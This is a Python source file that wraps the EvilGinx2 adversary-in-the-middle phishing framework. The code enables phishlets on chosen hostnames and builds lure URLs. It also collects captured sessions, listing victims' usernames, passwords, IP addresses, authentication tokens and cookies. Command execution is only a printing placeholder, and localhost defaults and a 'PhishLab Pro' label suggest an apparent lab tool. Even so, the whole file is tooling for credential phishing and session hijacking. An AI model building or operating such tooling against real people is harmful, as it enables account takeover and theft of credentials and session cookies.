"""
EvilGinx2 Controller - Python wrapper for EvilGinx2
"""

import os
import subprocess
import json
import glob
from datetime import datetime

class EvilGinxController:
    """Control EvilGinx2 from Python"""
    
    def __init__(self, evilginx_path=None, phishlets_path=None):
        self.evilginx_path = evilginx_path or os.path.expanduser("~/evilginx2/bin/evilginx")
        self.phishlets_path = phishlets_path or os.path.expanduser("~/evilginx2/phishlets")
        self.sessions_path = os.path.expanduser("~/evilginx2/sessions")
        
    def get_available_phishlets(self):
        """Get list of available phishlets"""
        phishlets = []
        
        if not os.path.exists(self.phishlets_path):
            return phishlets
        
        yaml_files = glob.glob(os.path.join(self.phishlets_path, "*.yaml"))
        
        for filepath in yaml_files:
            filename = os.path.basename(filepath)
            name = filename.replace('.yaml', '')
            
            phishlet_info = self._parse_phishlet(filepath)
            
            phishlets.append({
                'name': name,
                'filename': filename,
                'display_name': phishlet_info.get('name', name.title()),
                'author': phishlet_info.get('author', 'Unknown'),
                'min_version': phishlet_info.get('min_ver', '2.3.0'),
                'enabled': False,
                'hostname': None
            })
        
        return sorted(phishlets, key=lambda x: x['name'])
    
    def _parse_phishlet(self, filepath):
        """Parse phishlet YAML for basic info"""
        try:
            info = {
                'name': None,
                'author': 'Unknown',
                'min_ver': '2.3.0'
            }
            
            with open(filepath, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('name:'):
                        info['name'] = line.split(':', 1)[1].strip().strip('"\'')
                    elif line.startswith('author:'):
                        info['author'] = line.split(':', 1)[1].strip().strip('"\'')
                    elif line.startswith('min_ver:'):
                        info['min_ver'] = line.split(':', 1)[1].strip().strip('"\'')
            
            return info
        except Exception as e:
            print(f"Error parsing phishlet {filepath}: {e}")
            return {}
    
    def parse_phishlet_config(self, phishlet_name):
        """Parse full phishlet configuration"""
        filepath = os.path.join(self.phishlets_path, f"{phishlet_name}.yaml")
        
        if not os.path.exists(filepath):
            return None
        
        try:
            config = {
                'name': None,
                'author': 'Unknown',
                'min_version': '2.3.0',
                'proxy_hosts': [],
                'sub_filters': [],
                'auth_urls': [],
                'credentials': {}
            }
            
            with open(filepath, 'r') as f:
                content = f.read()
                
                for line in content.split('\n'):
                    line = line.strip()
                    if line.startswith('name:'):
                        config['name'] = line.split(':', 1)[1].strip().strip('"\'')
                    elif line.startswith('author:'):
                        config['author'] = line.split(':', 1)[1].strip().strip('"\'')
                    elif line.startswith('min_ver:'):
                        config['min_version'] = line.split(':', 1)[1].strip().strip('"\'')
            
            return config
            
        except Exception as e:
            print(f"Error parsing config for {phishlet_name}: {e}")
            return None
    
    def execute_command(self, command):
        """Execute EvilGinx2 command (placeholder for now)"""
        print(f"[EvilGinx Command] {command}")
        return {'success': True, 'output': f'Command: {command}', 'error': None}
    
    def enable_phishlet(self, phishlet_name, hostname):
        """Enable a phishlet with hostname"""
        try:
            if 'localhost' in hostname:
                self.execute_command("config domain localhost")
                self.execute_command("config ipv4 127.0.0.1")
            
            self.execute_command(f"phishlets hostname {phishlet_name} {hostname}")
            self.execute_command(f"phishlets enable {phishlet_name}")
            
            print(f"✅ PhishLab Pro: Enabled {phishlet_name} on {hostname}")
            return True
        except Exception as e:
            print(f"❌ Error: {e}")
            return False
    
    def disable_phishlet(self, phishlet_name):
        """Disable a phishlet"""
        try:
            self.execute_command(f"phishlets disable {phishlet_name}")
            print(f"✅ Disabled {phishlet_name}")
            return True
        except Exception as e:
            print(f"❌ Error: {e}")
            return False
    
    def create_lure(self, phishlet_name, redirect_url='https://www.google.com'):
        """Create phishing lure URL"""
        try:
            self.execute_command(f"lures create {phishlet_name}")
            if redirect_url:
                self.execute_command(f"lures edit 0 redirect_url {redirect_url}")
            return f"http://{phishlet_name}.localhost:443"
        except Exception as e:
            print(f"Error creating lure: {e}")
            return None
    
    def get_sessions(self):
        """Get captured sessions"""
        sessions = []
        
        if not os.path.exists(self.sessions_path):
            os.makedirs(self.sessions_path, exist_ok=True)
            return sessions
        
        session_files = glob.glob(os.path.join(self.sessions_path, "*.json"))
        
        for filepath in session_files:
            try:
                with open(filepath, 'r') as f:
                    session_data = json.load(f)
                    
                sessions.append({
                    'id': len(sessions) + 1,
                    'phishlet': session_data.get('phishlet', 'unknown'),
                    'username': session_data.get('username', 'N/A'),
                    'password': session_data.get('password', 'N/A'),
                    'ip': session_data.get('remote_addr', 'N/A'),
                    'timestamp': session_data.get('create_time', 'N/A'),
                    'tokens': session_data.get('tokens', {}),
                    'cookies': session_data.get('cookies', {}),
                    'filepath': filepath
                })
            except Exception as e:
                print(f"Error reading session {filepath}: {e}")
                continue
        
        return sorted(sessions, key=lambda x: x['timestamp'], reverse=True)
    
    def get_session_details(self, session_id):
        """Get detailed session info"""
        sessions = self.get_sessions()
        
        if session_id <= 0 or session_id > len(sessions):
            return None
        
        return sessions[session_id - 1]

# Singleton instance
_controller = None

def get_evilginx_controller():
    """Get or create EvilGinx controller instance"""
    global _controller
    if _controller is None:
        _controller = EvilGinxController()
    return _controller
